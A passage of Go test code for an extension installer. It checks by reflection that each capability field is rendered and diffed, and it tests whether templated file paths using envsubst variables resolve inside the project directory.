// the SpecHostExposure nested inside it) contribute their own fields rather
// than one opaque entry. Without the descent the guard below would stop at
// "Spec" and lose coverage of the ~20 spec-derived capabilities.
func capabilityFieldPaths(typ reflect.Type, prefix string) []string {
	var paths []string
	for i := 0; i < typ.NumField(); i++ {
		field := typ.Field(i)
		path := prefix + field.Name
		if field.Type.Kind() == reflect.Struct {
			paths = append(paths, capabilityFieldPaths(field.Type, path+".")...)
			continue
		}
		paths = append(paths, path)
	}
	return paths
}

// TestCapabilitiesFieldsParticipateInRenderAndDiff is the structural
// completeness guard behind diffCapabilities' promise that every list- or
// count-valued field on capabilities participates: the hand-enumerated tables
// in render and diffCapabilities cannot notice a newly added field, so
// reflection forces a case or an exemption for each one.
func TestCapabilitiesFieldsParticipateInRenderAndDiff(t *testing.T) {
	// exempt names the fields this single-field-at-a-time sweep cannot
	// exercise, and why.
	exempt := map[string]string{
		"Spec.YoloFlag": "only active together with YoloEnabled; covered by TestInspectYoloDefaultsToEnabled " +
			"and TestDiffCapabilitiesReportsNewlyEnabledYolo",
		"Spec.YoloEnabled":     "see Spec.YoloFlag",
		"Spec.DefaultEnabled":  "the spec's opt-in flag, not a capability; covered by TestAddOptInFeaturePrintsEnableHint",
		"Spec.DefaultIncluded": "a profile-composition default, not a capability",
		"Spec.AllowedDomains": "folded into capabilities.AllowDomains by inspect; covered by " +
			"TestInspectReportsCapabilities",
		"Spec.Kind":        "extension identity, not a capability: render's header carries it",
		"Spec.Name":        "extension identity, not a capability: render's header carries it",
		"Spec.DisplayName": "extension identity, not a capability; reported by `list --json`",
		"Spec.Description": "extension identity, not a capability; reported by `list --json`",
		"ShadowsBuiltin": "set by the installer around inspect rather than derived from the tree; diffing it " +
			"would read as 'newly shadowing' on every update of an extension that already shadows a built-in",
	}
	cases := capabilityFieldCases()

	paths := capabilityFieldPaths(reflect.TypeOf(capabilities{}), "")
	if len(paths) < len(cases)+len(exempt) {
		t.Fatalf("reflection found only %d fields for %d cases and %d exemptions: the walk is not "+
			"descending into the spec projection", len(paths), len(cases), len(exempt))
	}
	for _, path := range paths {
		if reason, ok := exempt[path]; ok {
			t.Logf("skipping %s: %s", path, reason)
			delete(exempt, path)
			continue
		}
		tc, ok := cases[path]
		if !ok {
			t.Fatalf("capability field %q has no case in capabilityFieldCases and is not in the "+
				"exemption set in this test; add one or exempt it deliberately", path)
		}
		delete(cases, path)
		t.Run(path, func(t *testing.T) {
			var after capabilities
			tc.set(&after)

			var buf bytes.Buffer
			after.render(&buf, Style{}, "")
			if !strings.Contains(buf.String(), tc.wantRender) {
				t.Errorf("render output does not contain %q for field %s:\n%s", tc.wantRender, path, buf.String())
			}

			var before capabilities
			changes := diffCapabilities(before, after)
			if len(changes) == 0 {
				t.Fatalf("diffCapabilities produced no changes when only %s differs from its zero value", path)
			}
			if joined := strings.Join(changes, "\n"); !strings.Contains(joined, tc.wantDiff) {
				t.Errorf("diffCapabilities output does not contain %q for field %s: %v", tc.wantDiff, path, changes)
			}
		})
	}
	// Anything left over names a field that no longer exists, which would
	// otherwise let a renamed field keep a stale case and lose its coverage.
	for path := range cases {
		t.Errorf("capabilityFieldCases has a case for %q, which is not a field of capabilities", path)
	}
	for path := range exempt {
		t.Errorf("the exemption set names %q, which is not a field of capabilities", path)
	}
}

// TestWritesIntoProject covers the destinations an initFiles path can resolve
// to once kit-init.sh has run envsubst over it. The unbraced forms matter as
// much as the braced ones: envsubst expands both.
func TestWritesIntoProject(t *testing.T) {
	for _, tc := range []struct {
		path string
		want bool
	}{
		{"${WORKDIR}/.foo.yaml", true},
		{"$WORKDIR/.foo.yaml", true},
		{"${HOME}/.config/foo.yaml", false},
		{"$HOME/.config/foo.yaml", false},
		{"/etc/foo.yaml", false},
		// No shell ever sees this path: kit-init.sh runs envsubst over it and
		// uses the result quoted, so "~" stays a literal directory name under
		// the project rather than expanding to the home directory.
		{"~/.config/foo.yaml", true},
		{".foo.yaml", true},
		{"nested/.foo.yaml", true},
		{"${USER}/.foo.yaml", true},
		{"", false},
		{"   ", false},
		// Not in the envsubst whitelist, so it stays literal and resolves like
		// any other relative segment.
		{"$PROJECT_DIR/.foo.yaml", true},
		// envsubst reads the longest identifier, so these are their own
		// (unsubstituted) variables rather than HOME/WORKDIR plus text.
		{"$HOMEBREW_PREFIX/foo.yaml", true},
		{"$WORKDIR_EXTRA/foo.yaml", true},
	} {
		if got := writesIntoProject(tc.path); got != tc.want {
			t.Errorf("writesIntoProject(%q) = %v, want %v", tc.path, got, tc.want)
		}
	}
}
